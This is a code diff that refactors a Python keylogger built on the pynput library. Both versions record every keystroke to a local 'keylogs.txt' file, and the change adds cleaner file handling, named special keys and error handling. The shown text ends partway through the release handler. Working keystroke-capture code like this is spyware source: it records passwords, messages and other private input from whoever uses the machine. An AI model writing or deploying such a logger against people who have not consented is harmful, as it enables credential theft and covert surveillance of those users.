@@ -1,19 +1,20 @@
-import pynput
+import os
 from pynput import keyboard
+
+log_file = "keylogs.txt"
 
 def on_press(key):
     try:
-        with open("keylogs.txt", "a") as f:
-            if key.char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
+        if hasattr(key, 'char') and key.char.isalnum():
+            with open(log_file, 'a') as f:
                 f.write(key.char)
-                print(f"Key pressed: {key.char}")
-            else:
-                f.write(f"<{key}>")
-                print(f"Special key pressed: <{key}>")
+        else:
+            with open(log_file, 'a') as f:
+                f.write(f" <{key.name}> ")
     except AttributeError:
-        with open("keylogs.txt", "a") as f:
-            f.write(f"<{key}>")
-            print(f"Special key pressed: <{key}>")
+        pass
+    except IOError:
+        print("Error writing to file")
 
 def on_release(key):
     if key == keyboard.Key.esc:
